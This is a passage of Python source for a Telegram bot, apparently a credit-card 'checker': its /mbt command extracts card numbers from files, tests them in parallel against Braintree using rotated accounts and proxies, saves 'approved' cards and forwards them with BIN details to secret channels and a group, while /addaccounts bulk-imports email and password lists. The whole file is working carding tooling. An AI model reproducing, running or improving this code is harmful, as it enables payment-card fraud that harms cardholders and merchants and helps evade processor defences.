        buttons.append([pbtn(f"🗑 {a['email'][:40]}", f"rm_acc:{a['email']}", style="danger")])
    await event.answer()
    try:
        await client.send_message(event.chat_id, f"<b>{bs('Choose account to remove')}:</b>", buttons=buttons)
    except: pass


@client.on(events.CallbackQuery(pattern=rb"rm_acc:(.+)"))
async def cb_rm_acc(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    email = event.pattern_match.group(1).decode()
    ok = await remove_account(email)
    await event.answer(f"✅ {bs('Removed')}" if ok else f"❌ {bs('Failed')}", alert=True)


@client.on(events.CallbackQuery(data=b"show_proxies"))
async def cb_show_proxies(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    proxies = await get_proxies()
    if not proxies:
        return await event.answer(f"{bs('No Proxies')}", alert=True)
    txt = f"🔐 <b>{bs('Proxies')}:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for i, p in enumerate(proxies[:20], 1):
        txt += f"<code>{i}.</code> <b>{p['proxy_url'][:50]}</b>\n"
    await event.answer(f"{len(proxies)} proxies")
    try:
        await client.send_message(event.chat_id, premium_emoji(txt), parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"add_proxy"))
async def cb_add_proxy(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    USER_STATE[event.sender_id] = {"action": "add_proxy"}
    try: await event.delete()
    except: pass
    await styled_send(event.chat_id,
        f"🔐 <b>{bs('Add Proxy')}</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>{bs('Send')}:</b> <code>http://user:pass@ip:port</code>\n"
        f"<b>{bs('Or')}:</b> <code>cancel</code>")


@client.on(events.CallbackQuery(data=b"remove_proxy"))
async def cb_remove_proxy(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    proxies = await get_proxies()
    if not proxies:
        return await event.answer(f"{bs('No Proxies')}", alert=True)
    buttons = []
    for p in proxies[:10]:
        buttons.append([pbtn(f"🗑 {p['proxy_url'][:40]}", f"rm_px:{p['proxy_url']}", style="danger")])
    await event.answer()
    try:
        await client.send_message(event.chat_id, f"<b>{bs('Choose proxy to remove')}:</b>", buttons=buttons)
    except: pass


@client.on(events.CallbackQuery(pattern=rb"rm_px:(.+)"))
async def cb_rm_px(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    proxy_url = event.pattern_match.group(1).decode()
    ok = await remove_proxy(proxy_url)
    await event.answer(f"✅ {bs('Removed')}" if ok else f"❌ {bs('Failed')}", alert=True)


@client.on(events.CallbackQuery(data=b"refresh_stats"))
async def cb_refresh(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    stats = await get_stats()
    await event.answer(f"✅ A:{stats['approved']} | ❌ D:{stats['declined']}", alert=True)


# ═══════════════════════════════════════════════════════════
#  SECRET CHANNELS — Manage
# ═══════════════════════════════════════════════════════════
@client.on(events.CallbackQuery(data=b"show_secret"))
async def cb_show_secret(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    chans = await get_secret_channels()
    if not chans:
        return await event.answer(f"{bs('No Secret Channels')}", alert=True)
    txt = f"📢 <b>{bs('Secret Channels')}:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for i, c in enumerate(chans, 1):
        txt += f"<code>{i}.</code> <b>{c}</b>\n"
    await event.answer(f"{len(chans)} channels")
    try:
        await client.send_message(event.chat_id, premium_emoji(txt), parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"add_secret"))
async def cb_add_secret(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    USER_STATE[event.sender_id] = {"action": "add_secret"}
    try: await event.delete()
    except: pass
    await styled_send(event.chat_id,
        f"📢 <b>{bs('Add Secret Channel')}</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>{bs('Send channel ID')}:</b> <code>-100xxxxxxxxxx</code>\n"
        f"<b>{bs('Or')}:</b> <code>cancel</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"⚠️ <b>{bs('Make sure bot is admin in the channel')}</b>")


@client.on(events.CallbackQuery(data=b"remove_secret"))
async def cb_remove_secret(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    chans = await get_secret_channels()
    if not chans:
        return await event.answer(f"{bs('No Secret Channels')}", alert=True)
    buttons = []
    for c in chans[:10]:
        buttons.append([pbtn(f"🗑 {c}", f"rm_secret:{c}", style="danger")])
    await event.answer()
    try:
        await client.send_message(event.chat_id, f"<b>{bs('Choose channel to remove')}:</b>", buttons=buttons)
    except: pass


@client.on(events.CallbackQuery(pattern=rb"rm_secret:(.+)"))
async def cb_rm_secret(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    cid = event.pattern_match.group(1).decode()
    try:
        cid_int = int(cid)
    except:
        cid_int = cid
    ok, _ = await remove_secret_channel(cid_int)
    await event.answer(f"✅ {bs('Removed')}" if ok else f"❌ {bs('Failed')}", alert=True)


# ═══════════════════════════════════════════════════════════
#  /addaccounts
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addaccounts$'))
async def addaccounts_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return

    if not event.reply_to_msg_id:
        return await styled_reply(event,
            f"📁 <b>{bs('Add Accounts')}</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"📌 <b>{bs('Reply to a .txt file with')}</b> <code>/addaccounts</code>\n"
            f"📝 <b>{bs('File format')}:</b>\n"
            f"<code>email password</code>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>")

    try:
        rm = await event.get_reply_message()
        if not rm.file:
            return await styled_reply(event, f"⚠️ <b>{bs('Reply to a file')}</b>")

        loading = await styled_reply(event, f"⏳ <b>{bs('Reading file...')}</b>")

        fp = await rm.download_media()
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                content = await f.read()
        finally:
            try: os.remove(fp)
            except: pass

        added = 0
        skipped = 0
        invalid = 0

        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) < 2:
                invalid += 1
                continue
            email = parts[0].strip()
            password = " ".join(parts[1:]).strip()
            if "@" not in email or len(password) < 4:
                invalid += 1
                continue
            if email in _ACCOUNTS:
                skipped += 1
                continue
            await add_account(email, password)
            added += 1

        try: await loading.delete()
        except: pass

        await styled_reply(event,
            f"✅ <b>{bs('Accounts Imported')}</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"➕ <b>{bs('Added')}:</b> <code>{added}</code>\n"
            f"⏭ <b>{bs('Skipped')}:</b> <code>{skipped}</code>\n"
            f"❌ <b>{bs('Invalid')}:</b> <code>{invalid}</code>\n"
            f"📊 <b>{bs('Total')}:</b> <code>{len(_ACCOUNTS)}</code>")

    except Exception as e:
        try: await loading.delete()
        except: pass
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{str(e)[:150]}</code>")


# ═══════════════════════════════════════════════════════════
#  STATE HANDLER
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage())
async def state_handler(event):
    uid = event.sender_id
    if uid not in USER_STATE:
        return
    if uid not in ADMIN_ID:
        USER_STATE.pop(uid, None)
        return
    text = (event.raw_text or "").strip()
    if not text or text.startswith("/"):
        return

    state = USER_STATE.get(uid)
    action = state.get("action")

    if text.lower() == "cancel":
        USER_STATE.pop(uid, None)
        return await styled_reply(event, f"❌ <b>{bs('Cancelled')}</b>")

    if action == "add_account":
        parts = text.split()
        if len(parts) < 2:
            return await styled_reply(event, f"⚠️ <b>{bs('Send')}:</b> <code>email password</code>")
        email, password = parts[0], " ".join(parts[1:])
        await add_account(email, password)
        USER_STATE.pop(uid, None)
        return await styled_reply(event,
            f"✅ <b>{bs('Account Added')}</b>\n📧 <code>{email}</code>")

    if action == "add_proxy":
        proxy_url = text.strip()
        if not proxy_url.startswith(("http://", "https://", "socks4://", "socks5://")):
            return await styled_reply(event, f"⚠️ <b>{bs('Invalid format')}</b>")
        await add_proxy(proxy_url)
        USER_STATE.pop(uid, None)
        return await styled_reply(event, f"✅ <b>{bs('Proxy Added')}</b>")

    if action == "add_secret":
        try:
            cid = int(text.strip())
        except:
            return await styled_reply(event, f"⚠️ <b>{bs('Invalid ID')}</b>")

        # تحقق إن البوت مشرف
        try:
            await client.get_permissions(cid, "me")
        except Exception as e:
            return await styled_reply(event,
                f"⚠️ <b>{bs('Cannot access channel')}</b>\n"
                f"📌 <b>{bs('Make sure bot is admin in')}</b> <code>{cid}</code>\n"
                f"<code>{str(e)[:100]}</code>")

        ok, msg = await add_secret_channel(cid)
        USER_STATE.pop(uid, None)
        if ok:
            return await styled_reply(event,
                f"✅ <b>{bs('Secret Channel Added')}</b>\n"
                f"📢 <code>{cid}</code>")
        else:
            return await styled_reply(event, f"⚠️ <b>{msg}</b>")


# ═══════════════════════════════════════════════════════════
#  /mbt — MASS CHECK (OWNER ONLY)
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mbt\b'))
async def mbt_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return

    if uid in ACTIVE_MBT:
        return await styled_reply(event,
            f"⚠️ <b>{bs('Already Running')}</b>")

    cards_text = ""
    if event.reply_to_msg_id:
        try:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        cards_text += await f.read()
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm.text:
                cards_text += rm.text
        except:
            pass

    cards_text += "\n" + (event.raw_text or "")
    cards = extract_cc(cards_text)

    if not cards:
        return await styled_reply(event, f"📁 <b>{bs('Reply to a file with')}</b> <code>/mbt</code>")

    total = len(cards)
    if total == 0:
        return await styled_reply(event, f"❌ <b>{bs('No valid cards')}</b>")

    proc = {
        "stopped": False, "tasks": [],
        "current_card": "-", "current_response": "-",
        "approved": 0, "declined": 0, "errors": 0,
        "checked": 0, "total": total, "hits": [],
    }
    ACTIVE_MBT[uid] = proc

    chat_id = event.chat_id

    def build_buttons():
        pending = total - proc["checked"]
        return [
            [pbtn(f"💳 {bs(proc['current_card'][:42])}", "none", style="primary")],
            [pbtn(f"👁 {bs(proc['current_response'][:42])}", "none", style="primary")],
            [pbtn(f"🔥 {bs('A')} ━ {proc['approved']}", "none", style="success"),
             pbtn(f"❌ {bs('D')} ━ {proc['declined']}", "none", style="danger")],
            [pbtn(f"⚠️ {bs('E')} ━ {proc['errors']}", "none", style="success"),
             pbtn(f"📊 {proc['checked']}/{total}", "none", style="primary")],
            [pbtn(f"⏳ {bs('Pending')} ━ {pending}", "none", style="primary")],
            [pbtn(f"🛑 {bs('Stop')}", f"mbt_stop:{uid}", style="danger")],
        ]

    status_msg = await styled_reply(event,
        f"<b>{bs('Processing')} ━ {bs('Mass Check')} ━ {MBT_WORKERS}{bs('w')}</b>",
        buttons=build_buttons())

    last_update = [0]

    async def update_ui():
        now = time.time()
        if now - last_update[0] < 2.0: return
        last_update[0] = now
        try:
            await styled_edit(status_msg,
                f"<b>{bs('Processing')} ━ {bs('Mass Check')} ━ {MBT_WORKERS}{bs('w')}</b>",
                buttons=build_buttons())
        except: pass

    sem = asyncio.Semaphore(MBT_WORKERS)

    async def worker(card):
        if proc["stopped"]: return
        async with sem:
            if proc["stopped"]: return
            try:
                acc = await get_random_account()
                if not acc:
                    proc["errors"] += 1
                    proc["checked"] += 1
                    return
                proxy = await get_random_proxy()
                res = await bt_check_card(card, acc["email"], acc["password"], proxy=proxy)
                await mark_account_used(acc["email"])

                st = res.get("status", "Error")
                resp = res.get("response", "-")

                proc["current_card"] = card
                proc["current_response"] = resp

                if st == "Approved":
                    proc["approved"] += 1
                    proc["hits"].append(f"{card} | APPROVED | {resp}")
                    asyncio.create_task(save_card(card, "APPROVED", resp))

                    # ابعت للقنوات السرية + الجروب
                    try:
                        sender = await event.get_sender()
                        uname = sender.username or f"user_{uid}"
                        name = sender.first_name or "Admin"
                        bin_info = await get_bin_info(card.split('|')[0])
                        el = res.get("elapsed", 0)
                        asyncio.create_task(send_secret_hits(uid, uname, name, card, resp, el, bin_info))
                        asyncio.create_task(send_group_hit(uid, uname, name, card, resp))
                    except: pass

                elif st == "Declined":
                    proc["declined"] += 1
                    asyncio.create_task(save_card(card, "DECLINED", resp))
                else:
                    proc["errors"] += 1
                proc["checked"] += 1
            except asyncio.CancelledError:
                raise
            except:
                proc["errors"] += 1
                proc["checked"] += 1

            await update_ui()

    for i in range(0, total, MBT_WORKERS):
        if proc["stopped"]: break
        batch = cards[i:i + MBT_WORKERS]
        tasks = [asyncio.create_task(worker(c)) for c in batch]
        proc["tasks"] = tasks
        await asyncio.gather(*tasks, return_exceptions=True)

    was_stopped = proc["stopped"]
    ACTIVE_MBT.pop(uid, None)

    stop_label = f" ({bs('Stopped')})" if was_stopped else ""

    final_text = (
        f"✅ <b>{bs('Mass Check Complete')}{stop_label}</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"💳 <b>{bs('Total')}:</b> <code>{proc['checked']}/{total}</code>\n"
        f"🔥 <b>{bs('Approved')}:</b> <code>{proc['approved']}</code>\n"
        f"❌ <b>{bs('Declined')}:</b> <code>{proc['declined']}</code>\n"
        f"⚠️ <b>{bs('Errors')}:</b> <code>{proc['errors']}</code>"
    )

    final_buttons = [
        [pbtn(f"🔥 {bs('A')} ━ {proc['approved']}", "none", style="success"),
         pbtn(f"❌ {bs('D')} ━ {proc['declined']}", "none", style="danger")],
        [pbtn(f"⚠️ {bs('E')} ━ {proc['errors']}", "none", style="success"),
         pbtn(f"📊 {bs('T')} ━ {proc['checked']}/{total}", "none", style="primary")],
    ]

    for _ in range(3):
        try:
            await styled_edit(status_msg, final_text, buttons=final_buttons)
            break
        except:
            await asyncio.sleep(0.5)

    if proc["hits"]:
        try:
            filename = f"hits_{uid}_{int(time.time())}.txt"
            async with aiofiles.open(filename, "w", encoding="utf-8") as f:
                await f.write("=" * 50 + "\n")
                await f.write("     BRAINTREE MASS CHECK HITS\n")
                await f.write("=" * 50 + "\n\n")
                for h in proc["hits"]:
                    await f.write(h + "\n")
            try:
                await styled_send(uid, f"📁 <b>{bs('Hits File')}</b>", file=filename)
            except: pass
            try: os.remove(filename)
            except: pass
        except: pass


@client.on(events.CallbackQuery(pattern=rb"mbt_stop:(\d+)"))
async def mbt_stop_cb(event):
    try:
        puid = int(event.pattern_match.group(1).decode())
    except:
        return await event.answer(f"⚠️ {bs('Invalid')}!", alert=True)

    if event.sender_id != puid and event.sender_id not in ADMIN_ID:
        return await event.answer(f"{bs('Not Yours')}!", alert=True)

    proc = ACTIVE_MBT.get(puid)
    if not proc:
        return await event.answer(f"{bs('No Active Process')}!", alert=True)

    proc["stopped"] = True
    for t in proc.get("tasks", []):
        if not t.done():
            t.cancel()
    await event.answer(f"🛑 {bs('Stopping')}...", alert=True)


# ═══════════════════════════════════════════════════════════
#  GROUP RESTRICTION
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_group and not e.out))
async def group_restrict(event):
    uid = event.sender_id
    if uid in ADMIN_ID:
        return
    chat_id = event.chat_id
    if is_group_allowed(chat_id):
        return
    text = (event.raw_text or "").strip()
    if text.startswith(("/", ".")):
        try:
            await styled_reply(event,
                f"🚫 <b>{bs('Not Allowed Here')}</b>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                f"📌 <b>{bs('Use the bot in private')}</b>\n"
                f"<b>━━━━━━━━━━━━━━━━━</b>")
        except:
            pass


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════
async def main():
    global client_instance
    client_instance = client

    log.info("Initializing storage...")
    await init_storage()

    for aid in ADMIN_ID:
        await ensure_user(aid)

    accs = await get_accounts()
    if not accs:
        log.warning("⚠️ No accounts! Use /panel or /addaccounts")
    else:
        active = await get_active_accounts()
        log.info(f"✅ Loaded {len(accs)} account(s) ({len(active)} active)")

    proxies = await get_proxies()
    log.info(f"✅ Loaded {len(proxies)} prox(ies)")

    secret = await get_secret_channels()
    log.info(f"✅ Loaded {len(secret)} secret channel(s)")

    while True:
        try:
            log.info("Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log.info("✅ Bot started successfully!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log.warning(f"FloodWait {e.seconds}s")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log.error(f"Crash: {e}")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
